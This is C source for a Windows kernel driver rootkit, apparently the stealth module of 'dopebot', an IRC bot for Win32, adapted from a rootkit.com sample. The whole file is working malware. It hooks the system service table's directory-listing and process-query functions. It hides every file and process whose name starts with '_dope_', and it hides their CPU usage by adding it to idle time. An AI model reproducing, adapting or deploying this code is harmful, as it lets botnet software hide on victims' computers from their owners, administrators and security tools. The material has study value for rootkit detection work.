/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

//BASIC 8 By Greg Hoglund, www.rootkit.com, Modified By dope.
#include "ntddk.h"
#include "stdarg.h"
#include "stdio.h"
#include "ntiologc.h"

#define DWORD unsigned long
#define WORD unsigned short
#define BOOL unsigned long

#define PROCNAMELEN 32
#define NT_PROCNAMELEN 32

ULONG gProcessNameOffset;

typedef struct _FILETIME
{ 
	DWORD dwLowDateTime; 
	DWORD dwHighDateTime; 
} FILETIME;

#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)_function+1)]

struct _SYSTEM_THREADS
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientIs;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters;
	struct _SYSTEM_THREADS Threads[1];
};

struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER DpcTime;
	LARGE_INTEGER InterruptTime;
	ULONG InterruptCount;
};

#if 0
typedef enum _WXPFILE_INFORMATION_CLASS
{
	FileDirectoryInformation         = 1,
	FileFullDirectoryInformation,   // 2
	FileBothDirectoryInformation,   // 3
	FileBasicInformation,           // 4  wdm
	FileStandardInformation,        // 5  wdm
	FileInternalInformation,        // 6
	FileEaInformation,              // 7
	FileAccessInformation,          // 8
	FileNameInformation,            // 9
	FileRenameInformation,          // 10
	FileLinkInformation,            // 11
	FileNamesInformation,           // 12
	FileDispositionInformation,     // 13
	FilePositionInformation,        // 14 wdm
	FileFullEaInformation,          // 15
	FileModeInformation,            // 16
	FileAlignmentInformation,       // 17
	FileAllInformation,             // 18
	FileAllocationInformation,      // 19
	FileEndOfFileInformation,       // 20 wdm
	FileAlternateNameInformation,   // 21
	FileStreamInformation,          // 22
	FilePipeInformation,            // 23
	FilePipeLocalInformation,       // 24
	FilePipeRemoteInformation,      // 25
	FileMailslotQueryInformation,   // 26
	FileMailslotSetInformation,     // 27
	FileCompressionInformation,     // 28
	FileObjectIdInformation,        // 29
	FileCompletionInformation,      // 30
	FileMoveClusterInformation,     // 31
	FileQuotaInformation,           // 32
	FileReparsePointInformation,    // 33
	FileNetworkOpenInformation,     // 34
	FileAttributeTagInformation,    // 35
	FileTrackingInformation,        // 36
	FileIdBothDirectoryInformation, // 37
	FileIdFullDirectoryInformation, // 38
	FileValidDataLengthInformation, // 39
	FileShortNameInformation,       // 40
	FileMaximumInformation
} WXPFILE_INFORMATION_CLASS, *PWXPFILE_INFORMATION_CLASS;
#endif

#define FileIdFullDirectoryInformation 38
#define FileIdBothDirectoryInformation 37

typedef struct _FILE_DIRECTORY_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	LARGE_INTEGER FileId;
	WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	ULONG FileNameLength;
	WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile
(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation
(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);

typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)
(
	HANDLE hFile,
	HANDLE hEvent,
	PIO_APC_ROUTINE IoApcRoutine,
	PVOID IoApcContext,
	PIO_STATUS_BLOCK pIoStatusBlock,
	PVOID FileInformationBuffer,
	ULONG FileInformationBufferLength,
	FILE_INFORMATION_CLASS FileInfoClass,
	BOOLEAN bReturnOnlyOneEntry,
	PUNICODE_STRING PathMask,
	BOOLEAN bRestartQuery
);

typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)
(
	ULONG SystemInformationCLass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

	ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;
	ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

	LARGE_INTEGER m_UserTime;
	LARGE_INTEGER m_KernelTime;

BOOL GetProcessName(PCHAR theName)
{
	PEPROCESS curproc;
	char *nameptr;
	ULONG i;
	KIRQL oldirql;
	if (gProcessNameOffset) 
    {
			curproc = PsGetCurrentProcess();
			nameptr = (PCHAR) curproc + gProcessNameOffset;
			strncpy(theName, nameptr, NT_PROCNAMELEN);
			theName[NT_PROCNAMELEN] = 0;
			return TRUE;
    } 
		return FALSE;
}

DWORD getDirEntryLenToNext(IN PVOID FileInformationBuffer, IN FILE_INFORMATION_CLASS FileInfoClass)
{
	DWORD result = 0;
	switch(FileInfoClass)
	{
			case FileDirectoryInformation:
					result = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
					break;
			case FileFullDirectoryInformation:
					result = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
					break;
			case FileIdFullDirectoryInformation:
					result = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
					break;
			case FileBothDirectoryInformation:
					result = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
					break;
			case FileIdBothDirectoryInformation:
					result = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
					break;
			case FileNamesInformation:
					result = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
					break;
	}
		return result;
}

void setDirEntryLenToNext(IN PVOID FileInformationBuffer, IN FILE_INFORMATION_CLASS FileInfoClass, IN DWORD value)
{
	switch(FileInfoClass)
	{
			case FileDirectoryInformation:
					((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
					break;
			case FileFullDirectoryInformation:
					((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
					break;
			case FileIdFullDirectoryInformation:
					((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
					break;
			case FileBothDirectoryInformation:
					((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
					break;
			case FileIdBothDirectoryInformation:
					((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
					break;
			case FileNamesInformation:
					((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
					break;
        }
}
        
PVOID getDirEntryFileName(IN PVOID FileInformationBuffer, IN FILE_INFORMATION_CLASS FileInfoClass)
{
	PVOID result = 0;
	switch(FileInfoClass)
	{
			case FileDirectoryInformation:
					result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
					break;
			case FileFullDirectoryInformation:
					result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
					break;
			case FileIdFullDirectoryInformation:
					result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
					break;
			case FileBothDirectoryInformation:
					result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
					break;
			case FileIdBothDirectoryInformation:
					result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
					break;
			case FileNamesInformation:
					result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
					break;
	}
		return result;
}

ULONG getDirEntryFileLength(IN PVOID FileInformationBuffer, IN FILE_INFORMATION_CLASS FileInfoClass)
{
	ULONG result = 0;
	switch(FileInfoClass)
	{
			case FileDirectoryInformation:
					result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
					break;
			case FileFullDirectoryInformation:
					result =(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
					break;
			case FileIdFullDirectoryInformation:
					result =(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
					break;
			case FileBothDirectoryInformation:
					result =(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
					break;
			case FileIdBothDirectoryInformation:
					result =(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
					break;
			case FileNamesInformation:
					result =(ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
					break;
	}
		return result;
}

NTSTATUS NewZwQueryDirectoryFile(IN HANDLE hFile, IN HANDLE hEvent OPTIONAL, IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL, IN PVOID IoApcContext OPTIONAL, OUT PIO_STATUS_BLOCK pIoStatusBlock, OUT PVOID FileInformationBuffer, IN ULONG FileInformationBufferLength, IN FILE_INFORMATION_CLASS FileInfoClass, IN BOOLEAN bReturnOnlyOneEntry, IN PUNICODE_STRING PathMask OPTIONAL, IN BOOLEAN bRestartQuery)
{
	NTSTATUS rc;
	CHAR aProcessName[PROCNAMELEN];
		GetProcessName(aProcessName);
		rc = ((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile))(
				hFile,
				hEvent,
				IoApcRoutine,
				IoApcContext,
				pIoStatusBlock,
				FileInformationBuffer,
				FileInformationBufferLength,
				FileInfoClass,
				bReturnOnlyOneEntry,
				PathMask,
				bRestartQuery);
	if (NT_SUCCESS(rc) && 
			(FileInfoClass == FileDirectoryInformation ||
			FileInfoClass == FileFullDirectoryInformation ||
			FileInfoClass == FileIdFullDirectoryInformation ||
			FileInfoClass == FileBothDirectoryInformation ||
			FileInfoClass == FileIdBothDirectoryInformation ||
			FileInfoClass == FileNamesInformation)) 
	{
		if (0 == memcmp(aProcessName, "_dope_", 6)) {}
		else
		{
			PVOID p = FileInformationBuffer;
			PVOID pLast = NULL;
			BOOL bLastOne;
			do 
			{
					bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
				if (getDirEntryFileLength(p,FileInfoClass) >= 12) 
				{
					if (RtlCompareMemory(getDirEntryFileName(p, FileInfoClass), (PVOID)"_\0d\0o\0p\0e\0_\0", 12 ) == 12 ) 
					{
						if (bLastOne) 
						{
							if (p == FileInformationBuffer) rc = 0x80000006;
							else setDirEntryLenToNext(pLast, FileInfoClass, 0);
								break;
						} 
						else 
						{
								int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
								int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p, FileInfoClass);
								RtlCopyMemory(p, (PVOID)((char *)p + getDirEntryLenToNext(p, FileInfoClass)), (DWORD)iLeft);
								continue;
						}
					}
				}
					pLast = p;
					p = ((char *)p + getDirEntryLenToNext(p, FileInfoClass));
			} while(!bLastOne);
		}
	}
		return(rc);
}

NTSTATUS NewZwQuerySystemInformation(IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength)
{
	NTSTATUS rc;
	CHAR aProcessName[PROCNAMELEN];
		GetProcessName(aProcessName);
		rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation))(
				SystemInformationClass,
				SystemInformation,
				SystemInformationLength,
				ReturnLength);
	if (NT_SUCCESS(rc))
	{
		if(0 == memcmp(aProcessName, "_dope_", 6)) {}
		else if (5 == SystemInformationClass)
		{
			int iChanged = 0;
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;
			while(curr)
			{
				ANSI_STRING process_name;
					RtlUnicodeStringToAnsiString(&process_name, &(curr->ProcessName), TRUE);
				if ((0 < process_name.Length) && (255 > process_name.Length))
				{
					if (0 == memcmp(process_name.Buffer, "_dope_", 6))
					{
							iChanged = 1;
							m_UserTime.QuadPart += curr->UserTime.QuadPart;
							m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
						if (prev)
						{
							if (curr->NextEntryDelta)
							{
									prev->NextEntryDelta += curr->NextEntryDelta;
							}
							else
							{
									prev->NextEntryDelta = 0;
							}
						}
						else
						{
							if (curr->NextEntryDelta)
							{
									(char *)SystemInformation += curr->NextEntryDelta;
							}
							else
							{
									SystemInformation = NULL;
							}
						}
					}
				}
				else
				{
						curr->UserTime.QuadPart += m_UserTime.QuadPart;
						curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
						m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}
						RtlFreeAnsiString(&process_name);
					if (0 == iChanged)
						prev = curr;
					else
						iChanged = 0;
					if (curr->NextEntryDelta)
						((char *)curr += curr->NextEntryDelta);
					else
						curr = NULL;
				}
			}
			else if (8 == SystemInformationClass)
			{
					struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
					times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
			}
		}
	return(rc);
}

NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
		Irp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return Irp->IoStatus.Status;
}

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	_asm cli
			(ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile)) = OldZwQueryDirectoryFile;
			(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation)) = OldZwQuerySystemInformation;
	_asm sti
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	int i;
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) 
	{
			theDriverObject->MajorFunction[i] = OnStubDispatch;
	}
		theDriverObject->DriverUnload  = OnUnload; 
		m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
		OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));
		OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
	_asm cli
			(ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile)) = NewZwQueryDirectoryFile;
			(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation)) = NewZwQuerySystemInformation;
	_asm sti
		return STATUS_SUCCESS;
}